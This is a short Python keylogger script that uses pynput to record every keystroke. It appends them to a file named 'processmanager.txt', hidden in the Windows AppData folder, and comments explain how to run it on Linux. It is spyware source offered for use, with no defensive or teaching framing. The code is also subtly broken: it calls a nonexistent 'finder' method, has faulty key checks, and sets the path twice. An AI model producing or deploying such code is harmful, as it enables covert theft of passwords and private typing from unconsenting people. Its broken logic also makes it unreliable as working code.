import os
from pynput.keyboard import Listener

keys = []
count = 0
path = os.environ['appdata'] + '\\processmanager.txt' ## for windows systems ## for linux machine you dont need //root --> path = '/root/processmanager.txt' ## if you want to running in linux
path = 'processmanager.txt' ## if you want to running in linux

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "") ## organizing the code, because it replaces single quotes for nothing
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n') # if enter just insert new line
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' CapsLock ')
            elif k.finder('Key'):
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()